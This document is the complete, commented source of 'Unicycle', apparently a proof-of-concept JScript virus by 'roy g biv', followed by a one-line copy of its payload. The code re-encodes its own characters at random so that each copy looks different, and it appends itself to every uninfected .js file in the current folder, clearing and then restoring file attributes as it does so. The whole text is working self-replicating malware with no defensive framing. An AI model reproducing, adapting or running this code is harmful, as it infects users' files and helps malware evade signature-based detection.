a=new ActiveXObject("scripting.filesystemobject")
b=a.opentextfile(WScript.scriptfullname).readall()
b=b.substr(b.search(c=/;\/\*Unicycle/))         //remove everything before our code
e=b.substr(0,d=b.search(/\*\//)+2)              //skip comment section
Math.random(f=1)                                //let's make it different every time
while(d<b.length)
{
  if(f&&(((g=b.substr(d,4))=="new ")||g=="else"||g=="for("||g=="try{"||((g=b.substr(d,5))=="while"))||g=="catch"||((g=b.substr(d,2))=="if"))e=e+g
                                                //add statements if not between ""
  else
  {
    if(g=="\\"+"u")b=b.substr(0,d)+eval("'"+b.substr(d,6)+"'")+b.substr(d+6)
                                                //decode "\u" encoding
    g=b.charAt(d)                               //get character
    f^=g=='"'                                   //remember if "
    e=e+(" !\"&'()+,./0124568*;<:=>?{\\^}|".indexOf(g)+1||Math.random()>.5?g:"\\"+"u00"+b.charCodeAt(d).toString(16))
                                                //store character if special, else encode it
  }
  d+=g.length
}
for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext())
                                                //demo version, current directory only
{
  if(a.getextensionname(b=d.item()).toLowerCase()=="js")try
  {
    f=b.attributes
    b.attributes=0
    if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e)
                                                //append ourselves if not infected already
    b.attributes=f
  }
  catch(z)
  {
  }
}
//;/*Unicycle - roy g biv 01/04/07*/a=new ActiveXObject("scripting.filesystemobject");b=a.opentextfile(WScript.scriptfullname).readall();b=b.substr(b.search(c=/;\/\*Unicycle/));e=b.substr(0,d=b.search(/\*\//)+2);Math.random(f=1);while(d<b.length){if(f&&(((g=b.substr(d,4))=="new ")||g=="else"||g=="for("||g=="try{"||((g=b.substr(d,5))=="while"))||g=="catch"||((g=b.substr(d,2))=="if"))e=e+g;else{if(g=="\\"+"u")b=b.substr(0,d)+eval("'"+b.substr(d,6)+"'")+b.substr(d+6);g=b.charAt(d);f^=g=='"';e=e+(" !\"&'()+,./0124568*;<:=>?{\\^}|".indexOf(g)+1||Math.random()>.5?g:"\\"+"u00"+b.charCodeAt(d).toString(16))}d+=g.length}for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext()){if(a.getextensionname(b=d.item()).toLowerCase()=="js")try{f=b.attributes;b.attributes=0;if(a.opentextfile(b).readall().search(c)<0)a.opentextfile(b,8).write(e);b.attributes=f}catch(z){}}